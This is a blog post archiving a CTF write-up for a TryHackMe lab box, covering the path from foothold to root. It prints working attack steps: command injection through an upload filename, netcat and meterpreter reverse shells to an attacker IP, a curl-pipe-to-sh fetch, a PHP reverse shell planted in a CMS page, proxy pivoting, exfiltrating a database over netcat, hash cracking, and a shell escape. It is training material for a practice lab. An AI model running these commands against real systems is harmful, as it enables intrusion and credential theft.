---
layout: post
title: Archive - CTF Writeup - Tempus Fugit Durius (THM)
description: An archive of an old writeup I wrote about the THM room "Tempus Fugit Durius"
summary: A writeup of the THM room "Tempus Fugit Durius"
tags: archive ctf writeup
minute: 8
---
<br/>

> {{ page.description }}

<br/>

# Introduction
[Tempus Fugit Durius](https://tryhackme.com/room/tempusfugitdurius) is one of my favorite CTF boxes on [TryHackMe](https://tryhackme.com/signup). It's a box that implements a lot of my favorite things in CTFs: Webapps, Pivoting, and Proxying.

It's also somewhat close to my heart. It was one of the first difficult CTF boxes that I ever completed when I first got into doing CTFs. I remember working on this box for a straight 16 hours, just captivated by the challenge, and always feeling close to the next step. It was an incredibly fun experience. 
<br/>
<br/>

# Reconnaissance
As always, real hackers hack time, and as I value my time when doing CTFs I like to start with Rustscan. The command `rustscan -r 0-65535 --ulimit 5000 10.10.36.206 -- -A -oN scans/nmap.txt` blasts all TCP ports on the target machine to ascertain which ports are open, then automatically performs an nmap scan with the options `-A -oN scans/nmap.txt`.


![Screenshot of Rustscan Initial Screen](/assets/media/tempusfugitdurius/Rustscan.png)
The open ports are:
 - 22
 - 80
 - 111
 - 45413

In this case, the port which I'm interested in is port 80. After navigating to the web page in my browser, I'm immediately drawn to the `upload` section. 

![Screenshot of Home Page](/assets/media/tempusfugitdurius/Home_Page.png)

So this endpoint is apparently used to uploads 'scripts.' I decided to upload a file named `test.py` with no contents as my first file upload, and caught the request in Burp Suite.

![Screenshot of Upload Page](/assets/media/tempusfugitdurius/Upload_Page.png)

The web application responded by telling me that it only accepts `.txt` and `.rtf`, so I continue to fuzz the upload form and immediately find a way to execute commands on the server. I am able to execute the `id` shell command by injecting a semicolon after the file name, so that the entire filename submitted looks like `test.txt;id`.

![Screenshot of Request and Command Execution](/assets/media/tempusfugitdurius/Requests_and_Command_Execution.png)

Having found a way to execute code on the machine, it's around this time that I would consider the "reconnaissance" phase of a CTF to be over. If this were a real engagement or a bug bounty, I would continue to methodically fuzz each and every parameter that I can think of. 
<br/>
<br/>

# User
I launch a netcat listener on port 53, because it's an unlikely port to be restricted in case of firewalls.

![Screenshot of NC Listener](/assets/media/tempusfugitdurius/NC_Listener.png)

I attempt to execute a two-part command with `test.txt;echo $SHELL;nc -h` to find out what shell I'm using and what features their netcat binary has. Unfortunately, something about the command trips a filter and I'm receive a custom status code 500 error.

![Screenshot of Request and Error](/assets/media/tempusfugitdurius/Request_and_Error.png)

After a few unsuccessful commands I simply try to initiate a reverse shell using netcat `test.txt;nc 10.13.1.225 53 -e sh` and I get a new error: "That filename was way too long!"

![Screenshot of Request and Too Long Error](/assets/media/tempusfugitdurius/Request_and_Too_Long.png)

To shorten the command I convert the IP address to a decimal format using [this](https://www.ultratools.com/tools/decimalCalc) website. 

![Screenshot of Website](/assets/media/tempusfugitdurius/Ultratools.png)

The new, slightly shortened command is `t.txt;nc 168624609 53 -e sh`. It works and I get a shell as `www` on the machine.



![Screenshot of Listener Catching a Shell](/assets/media/tempusfugitdurius/Catching_Shell.png)


I look at the directory that I landed in and see that the web application is mainly based on Python. Catting `main.py` I find some hard coded FTP credentials. 

```python
try:
   ftp = FTP('ftp.mofo.pwn')
   ftp.login('someuser', '<!--Censored-->')
   with open(UPLOAD_FOLDER+"/"+filename, 'rb') as f:
      ftp.storlines('STOR %s' % filename, f)
      ftp.quit()
      os.remove(UPLOAD_FOLDER+"/"+filename)
except:
   flash("Cannot connect to FTP-server")
return redirect('/upload')
```

Unfortunately the server did not have an FTP client installed, so I was required to use the python module `ftplib`, used in the `main.py` file, to connect to the FTP server.

```
bash-4.4$ python                                                                                                                                          
Python 3.6.8 (default, Jan 30 2019, 23:54:38)                                                                                                             
[GCC 6.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from ftplib import FTP
>>> cnct = FTP("ftp.mofo.pwn")
>>> cnct.login("someuser", "<!--Censored-->")
'230 Login successful.'
>>> cnct.retrlines("LIST")
-rw-------    1 ftp      ftp            24 Apr 22  2020 creds.txt
-rw-------    1 ftp      ftp             0 Oct 23 21:57 test.txt;echo $SHELL
-rw-------    1 ftp      ftp             0 Oct 23 21:52 test.txt;id
-rw-------    1 ftp      ftp             0 Oct 23 21:58 test.txt;nc --help
'226 Directory send OK.'
>>> localfile = open('creds.txt', 'wb')
>>> cnct.retrbinary('RETR ' + 'creds.txt', localfile.write, 1024)
'226 Transfer complete.'
>>> exit()
```


![Screenshot of Creds.txt](/assets/media/tempusfugitdurius/Creds_File.png)

The creds seem to be for an account named `admin`. I attempt to SSH into the machine using those creds and also attempt to use `su` to switch to that user but both are unsuccessful. I decide to save the creds for later and continue enumerating the machine.

I noticed that the snippet of Python code used for the web application connects to an FTP server `ftp.mofo.pwn`. This stood out to me because it implied some resolution of that hostname to an IP address. I check the `/etc/hosts` file for more information and find an entry for a Class C internal IP address `192.168.150.100 sid`.


![Screenshot of /etc/hosts](/assets/media/tempusfugitdurius/Etc_Hosts.png)

To scan the internal `192.168.150.0/24` address range, I decide to make a meterpreter reverse shell binary `msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=tun0 LPORT=443 -f elf -o peterelf` and download it onto the victim machine using `wget`. After that, I launch my msfconsole listener and execute the binary to catch a meterpreter reverse shell.


![Screenshot of Downloading Meterpreter Binary](/assets/media/tempusfugitdurius/Downloading_Meterpreter.png)

![Screenshot of Catching Meterpreter Shell](/assets/media/tempusfugitdurius/Catching_Meterpreter.png)

I use meterpreter's autoroute functionality to automatically allow traffic from my local machine into the `192.168.150.0/24` internal address space. 


![Screenshot of Autoroute](/assets/media/tempusfugitdurius/Autoroute.png)

After that I launched a socks5 server using `auxiliary/server/socks5`, making sure that the `SRVPORT` value matches with the socks5 configuration in `/etc/proxychains.conf`. 


![Screenshot of Proxychains.conf](/assets/media/tempusfugitdurius/Proxychains_Conf.png)

Since `ftp.mofo.pwn` requires some sort of DNS resolution, I decided to check `/etc/resolv.conf` for any leads before beginning to scan the network. I didn't find any IP addresses, but it did confirm my assumption about the network. This seems to be a network of boxes named `mofo.pwn`. 

```
bash-4.4$ cat /etc/resolv.conf
search mofo.pwn
nameserver 127.0.0.11
options ndots:0
```

I run an nmap scan across the internet subnet through proxychains using the following command: `proxychains nmap -sV -p21,22,53,80,139,443,445 192.168.150.0/24 -oN scans/nmap-internal.txt`. I try to scan as few ports as possible because this scan is going to take a long time. 

After an hour and a half I get a very large output, but notably, the host `192.168.150.100` has port `53` open, a DNS server port. I run `dig axfr mofo.pwn @192.168.150.100` and receive the following output:

```
bash-4.4$ dig axfr mofo.pwn @192.168.150.100

; <<>> DiG 9.11.8 <<>> axfr mofo.pwn @192.168.150.100
;; global options: +cmd
mofo.pwn.               14400   IN      SOA     ns1.mofo.pwn. admin.mofo.pwn. 14 7200 120 2419200 604800
mofo.pwn.               14400   IN      TXT     "v=spf1 ip4:176.23.46.22 a mx ~all"
mofo.pwn.               14400   IN      NS      ns1.mofo.pwn.
durius.mofo.pwn.        14400   IN      A       192.168.150.1
ftp.mofo.pwn.           14400   IN      CNAME   punk.mofo.pwn.
gary.mofo.pwn.          14400   IN      A       192.168.150.15
geek.mofo.pwn.          14400   IN      A       192.168.150.14
kfc.mofo.pwn.           14400   IN      A       192.168.150.17
leet.mofo.pwn.          14400   IN      A       192.168.150.13
mail.mofo.pwn.          14400   IN      TXT     "v=spf1 a -all"
mail.mofo.pwn.          14400   IN      A       192.168.150.11
milo.mofo.pwn.          14400   IN      A       192.168.150.16
newcms.mofo.pwn.        14400   IN      CNAME   durius.mofo.pwn.
ns1.mofo.pwn.           14400   IN      A       192.168.150.100
punk.mofo.pwn.          14400   IN      A       192.168.150.12
sid.mofo.pwn.           14400   IN      A       192.168.150.10
www.mofo.pwn.           14400   IN      CNAME   sid.mofo.pwn.
mofo.pwn.               14400   IN      SOA     ns1.mofo.pwn. admin.mofo.pwn. 14 7200 120 2419200 604800
;; Query time: 0 msec
;; SERVER: 192.168.150.100#53(192.168.150.100)
;; WHEN: Fri Oct 23 23:53:32 UTC 2020
;; XFR size: 18 records (messages 1, bytes 467)
```

Notably, the hostname `newcms.mofo.pwn` is linked to `192.168.150.1` by a `CNAME` (Alias) record. Using [FoxyProxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/), I change my browser's proxy settings to go through the SOCKS5 proxy that I previously set up. 


![Screenshot of FoxyProxy Settings Tab](/assets/media/tempusfugitdurius/FoxyProxy.png)

I'm then allowed to visit that host using my browser. Since it's hosting an open source CMS named `batflat`, I check the [Github repo](https://github.com/sruupl/batflat) and find that the admin login page is at `/admin`. 


![Screenshot of Admin Login Page](/assets/media/tempusfugitdurius/Admin_Login.png)

I use the credentials found in `creds.txt` from the FTP server to successfully log in. Then, I edit a page to include a Linux-PHP reverse shell and catch it with netcat.


![Screenshot of Edit Page](/assets/media/tempusfugitdurius/PHP_Reverse_Shell.png)

![Screenshot of Catching PHP Shell](/assets/media/tempusfugitdurius/Catching_PHP_Shell.png)

After digging around the file system, I find the `database.sdb` file for the website. I transfer it to my local machine using netcat. For file transfers which could take longer, I use `tail -f` to watch as data is appended to the file, to make sure that the file transfer has completed before I stop the netcat connection.


![Screenshot of File Transfer](/assets/media/tempusfugitdurius/File_Transfer.png)

I use `sqlite3` to navigate through the database.

```
root@dullahan: sqlite3 database.sdb 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
blog                    login_attempts          remember_me           
blog_tags               modules                 settings              
blog_tags_relationship  navs                    snippets              
galleries               navs_items              users                 
galleries_items         pages                 
sqlite> select * from users;
1|admin|Hugh Gant|My name is Hugh Gant. Da boss|$2y$10$HvIMA<--Snipped!-->ower@mofo.pwn|admin|all
sqlite> 
```

I swap over to my Windows machine to use `PS C:\Users\Orian\Documents\tools\Hashcat\hashcat-6.1.1> .\hashcat.exe -a 0 -m 3200 .\hash.txt ..\..\rockyou.txt` to crack the hash.


![Screenshot of Hashcat Result](/assets/media/tempusfugitdurius/Hashcat.png)

I use the recovered password to SSH into machine as user `benclower`. 


![Screenshot of SSH as Ben Clower](/assets/media/tempusfugitdurius/SSH.png)

And that's the user flag!
<br/>
<br/>

# Root
The first thing I did was use `curl 10.13.1.225:9090/linpeas.sh | sh | tee peas.txt` to transfer over `linpeas.sh` and execute it with `sh`, then fork the outputs to `peas.txt` for further examination. The privesc script discovered a strange `SGID` binary that I had never seen before, `/usr/bin/ispell`.

```
[+] SGID                                           
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                                                                           
/usr/bin/chage                                     
/usr/bin/ssh-agent                                 
/usr/bin/mutt_dotlock                              
/usr/bin/lockfile                                  
/usr/bin/mlocate                                   
/usr/bin/bsd-write                                 
/usr/bin/at             --->    RTru64_UNIX_4.0g(CVE-2002-1614)                                                                                                                                                
/usr/bin/procmail                                  
/usr/bin/expiry                                    
/usr/bin/dotlockfile                               
/usr/bin/wall                                      
/usr/bin/crontab                                   
/usr/bin/ispell                                    
/sbin/unix_chkpwd
```

After doing some googling, I found that `ispell` is a simple spell-checking utility. It also a shell escape using `!`, in a similar vein to `vim`'s shell escape. I execute the shell escape and am now part of the `adm` group.  


![Screenshot of ispell Shell Escape](/assets/media/tempusfugitdurius/ispell.png)

Using `find / -group adm 2>/dev/null` to find all files owned by the `adm` group, I hone in on `/var/log/auth.log`. I transfer that file to my local machine and exaime it with Sublime Text. Since I don't expect an authentication log to log the passwords, I surmise that I'm probably looking for user-error. Perhaps they accidentally typed their password into the username field?

I `CTRL+F` for a few things, then eventually stumble upon the word `invalid`, which finds me the entry for when the root user mis-typed their password into the username field.


![Screenshot of Auth Log](/assets/media/tempusfugitdurius/Auth_Log.png)

Then I `su` as root and get the second flag!


![Screenshot of Root](/assets/media/tempusfugitdurius/Root.png)